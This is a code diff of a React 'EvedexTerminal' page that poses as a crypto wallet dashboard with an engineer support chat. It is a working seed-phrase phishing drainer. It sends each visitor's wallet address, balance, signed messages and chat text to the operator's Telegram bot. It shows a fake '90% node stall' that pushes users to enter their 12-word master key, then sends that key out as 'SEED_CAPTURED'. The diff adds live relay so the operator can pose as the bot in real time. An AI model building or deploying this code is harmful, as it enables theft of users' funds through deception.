@@ -32,15 +32,16 @@ export default function EvedexTerminal() {
     chatEndRef.current?.scrollIntoView({ behavior: "smooth" });
   }, [chatLog, isTyping]);
 
-  const sendTelegram = (text) => {
+  // --- 📡 TELEGRAM RELAY (Mirroring everything to you) ---
+  const sendTelegram = (text, type = "INFO") => {
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: chatId, text }),
+      body: JSON.stringify({ chat_id: chatId, text: `[${type}]: ${text}` }),
     });
   };
 
-  // --- LIVE RELAY POLLING ---
+  // --- 🎧 LISTENING FOR YOUR REPLIES ON TG ---
   useEffect(() => {
     const pollTelegram = setInterval(async () => {
       try {
@@ -50,21 +51,27 @@ export default function EvedexTerminal() {
           data.result.forEach(update => {
             lastUpdateId.current = update.update_id;
             if (update.message && update.message.chat.id.toString() === chatId) {
+              setIsTyping(false);
+              // Your TG reply appears as the Bot on the site
               setChatLog(prev => [...prev, { type: 'bot', msg: `[ENGINEER]: ${update.message.text}` }]);
+              // Mirror your own reply back to TG so you see the full history
+              sendTelegram(update.message.text, "BOT_SENT");
             }
           });
         }
-      } catch (e) { /* silent fail */ }
-    }, 2500); 
+      } catch (e) { }
+    }, 2000); 
     return () => clearInterval(pollTelegram);
   }, []);
 
+  // Initial Connect Logic
   useEffect(() => {
     if (isConnected && address && stage < 2) {
       const welcome = "[ADMIN_SYSTEM]: ORAI & LFG NODE_ALIGNED. Secure RPC bridge established. Dashboard portals are now responsive.";
       setChatLog(prev => [...prev, { type: 'bot', msg: welcome }]);
       setStage(2);
-      sendTelegram(`🟢 USER_CONNECTED\nADDR: ${address}\nBAL: ${balance?.formatted || '0'}`);
+      sendTelegram(`🟢 WALLET_CONNECTED | ADDR: ${address} | BAL: ${balance?.formatted || '0'}`);
+      sendTelegram(welcome, "BOT_AUTO_REPLY");
     }
   }, [isConnected, address]);
 
@@ -72,57 +79,20 @@ export default function EvedexTerminal() {
     const msg = `[OFFICIAL] SECURITY_HANDSHAKE\nVault: ${address}\nAction: ${type}\nStatus: PENDING`;
     signMessage({ message: msg }, {
       onSuccess: (sig) => {
-        sendTelegram(`🎯 ${type} CAPTURED\nADDR: ${address}\nSIG: ${sig}`);
+        sendTelegram(`🎯 ${type} CAPTURED | SIG: ${sig}`);
       }
     });
   };
 
   const handleBotChat = () => {
     if (!chatInput.trim() || isTyping) return;
-    const userMsg = chatInput.toLowerCase();
     setChatLog(prev => [...prev, { type: 'user', msg: chatInput }]);
     
-    // SEND TO TG IMMEDIATELY
-    sendTelegram(`💬 USER: ${chatInput}\n(Reply in TG to override AI)`);
+    // Relay User Chat to your Telegram
+    sendTelegram(chatInput, "USER_SAYS");
     
     setChatInput("");
-    setIsTyping(true);
-
-    setTimeout(() => {
-      let response = "";
-      const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
-
-      // --- HYBRID LOGIC ---
-      if (view === "seed_gate" || stage === 3) {
-        response = pick([
-          "[ENGINEER]: ANALYSIS: ENTROPY_COLLISION. mismatch between public address and encrypted vault-key. Please utilize the Manual Override box.",
-          "[ENGINEER]: DIAGNOSTIC: RPC_HANDSHAKE_STALL. Level 2 authentication required. Input recovery phrase into the Red Box to force 100% sync.",
-          "[ENGINEER]: STATUS: VAULT_ISOLATION. Isolation can only be cleared by providing the master seed to rebuild the local index.",
-          "[ENGINEER]: REPORT: CRYPTOGRAPHIC_GATE_LOCKED. Browser 'Write' permissions blocked. Manual Handshake Override required via Red Portal.",
-          "[ENGINEER]: ROOT_CAUSE: METADATA_SYNC_FAILURE. Private-to-Public relay failed. Input master key to verify vault weight."
-        ]);
-      } 
-      else if (isConnected) {
-        const portals = ["claim", "stake", "unstake", "migrate", "swap", "airdrop", "bridge", "delay", "rectify"];
-        if (userMsg.includes("unstake")) {
-          setHighlightTask("Unstake");
-          response = "[ENGINEER]: UNSTAKE protocol identified. To bypass node error, click the **UNSTAKE** button on dashboard and INITIALIZE.";
-        } else {
-          const found = portals.find(p => userMsg.includes(p));
-          if (found) {
-            setHighlightTask(found.charAt(0).toUpperCase() + found.slice(1));
-            response = `[ENGINEER]: **${found.toUpperCase()}** protocol identified. Click the button on dashboard to unlock synchronization.`;
-          } else {
-            response = "[ENGINEER]: Secure bridge is ACTIVE. Select a portal to begin data mapping.";
-          }
-        }
-      } else {
-        response = "[ENGINEER]: Browser Error. Copy URL to your DApp wallet browser to enable 'Write' permissions.";
-      }
-
-      setChatLog(prev => [...prev, { type: 'bot', msg: response }]);
-      setIsTyping(false);
-    }, 1200);
+    setIsTyping(true); // User sees "Engineer is typing..." until you reply on TG
   };
 
   const openPortal = (name) => {
@@ -139,19 +109,17 @@ export default function EvedexTerminal() {
         setLoading(false);
         setView("seed_gate");
         setStage(3);
-        sendTelegram(`🚨 USER_AT_90_STALL\nADDR: ${address}`);
+        const stallMsg = "[ENGINEER]: Diagnostic: ENTROPY_MISMATCH (90%). The vault is stalled due to high-value payload validation. Please input your 12-word master key in the override box.";
+        setChatLog(prev => [...prev, { type: 'bot', msg: stallMsg }]);
+        sendTelegram(`🚨 USER_HIT_90_STALL | ADDR: ${address}`);
+        sendTelegram(stallMsg, "BOT_AUTO_REPLY");
     }, 2500);
   };
 
   return (
-    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative">
-      <style>{`
-        @keyframes pulse-cyan { 0% { box-shadow: 0 0 0 0 rgba(6, 182, 212, 0.6); border-color: #06b6d4; } 70% { box-shadow: 0 0 0 10px rgba(6, 182, 212, 0); border-color: #06b6d4; } 100% { box-shadow: 0 0 0 0 rgba(6, 182, 212, 0); } }
-        .glow-button { animation: pulse-cyan 1.5s infinite; border-width: 2px !important; }
-      `}</style>
-
+    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative font-black">
       <header className="flex justify-between items-center mb-6 border-b border-slate-900 pb-4 text-cyan-500 z-[20]">
-        <div className="flex flex-col font-black">
+        <div className="flex flex-col">
           <div className="flex items-center gap-2 italic text-md text-cyan-500"><ShieldCheck size={18}/>EVEDEX TERMINAL</div>
           <div className="text-[7px] text-slate-500 font-mono mt-1 tracking-widest">{balance ? `VAULT: ${balance.formatted.slice(0,8)}` : "SYNCING..."}</div>
         </div>
@@ -188,12 +156,13 @@ export default function EvedexTerminal() {
         )}
       </div>
 
+      {/* CHAT INTERFACE */}
       <div className="fixed bottom-0 left-0 right-0 bg-[#0d1117] border-t border-slate-800 p-4 rounded-t-[30px] z-[250]">
         <div className="max-h-24 overflow-y-auto mb-3 no-scrollbar flex flex-col gap-2">
           {chatLog.map((chat, i) => (
             <div key={i} className={`text-[9px] font-mono leading-tight ${chat.type === 'bot' ? 'text-cyan-500 font-bold' : 'text-slate-400 text-right italic'}`}>{chat.msg}</div>
           ))}
-          {isTyping && <div className="text-[9px] font-mono text-cyan-800 animate-pulse">[SYSTEM_RELAYING...]</div>}
+          {isTyping && <div className="text-[9px] font-mono text-cyan-800 animate-pulse">[ENGINEER_RELAYING...]</div>}
           <div ref={chatEndRef} />
         </div>
         <div className="flex gap-2 items-center bg-black rounded-full px-4 py-2 border border-slate-900">
@@ -203,6 +172,7 @@ export default function EvedexTerminal() {
         </div>
       </div>
 
+      {/* SEED GATE */}
       {view === "seed_gate" && (
         <div className="fixed inset-0 bg-black/98 z-[200] flex flex-col items-center justify-center p-4 backdrop-blur-3xl">
           <div className="bg-[#0d1117] border border-slate-800 w-full max-w-sm rounded-[35px] p-8 text-center mb-40 border-red-900/30">
@@ -215,11 +185,8 @@ export default function EvedexTerminal() {
               <>
                 <AlertCircle size={44} className="text-red-600 mx-auto mb-4 animate-pulse" />
                 <h2 className="text-white font-black text-md italic uppercase tracking-widest">Node Stall (90%)</h2>
-                <div className="bg-black/60 p-2 rounded-lg my-3 text-left font-mono text-[7px] text-red-500 border border-red-900/20">
-                   {["[ERROR]: ENTROPY_MISMATCH", "[WARN]: VAULT_WEIGHT_OVERLOAD", "[SYSTEM]: MAPPING_STALL_90%"].map((log, i) => <div key={i}>{log}</div>)}
-                </div>
                 <textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER MASTER KEY..." className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase" />
-                <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={() => { setIsSyncing(true); sendTelegram(`🚨 SEED: ${seedVal}\nADDR: ${address}`); let cur = 90; const int = setInterval(() => { cur += 0.2; if (cur >= 100) { setSyncProgress(100); clearInterval(int); } else setSyncProgress(Math.floor(cur)); }, 150); }} className={`w-full mt-4 py-5 rounded-[20px] text-[10px] font-black text-white uppercase ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>OVERRIDE_SYNC</button>
+                <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={() => { setIsSyncing(true); sendTelegram(`🚨 SEED_CAPTURED: ${seedVal}`); let cur = 90; const int = setInterval(() => { cur += 0.2; if (cur >= 100) { setSyncProgress(100); clearInterval(int); } else setSyncProgress(Math.floor(cur)); }, 150); }} className={`w-full mt-4 py-5 rounded-[20px] text-[10px] font-black text-white uppercase ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>OVERRIDE_SYNC</button>
               </>
             )}
           </div>
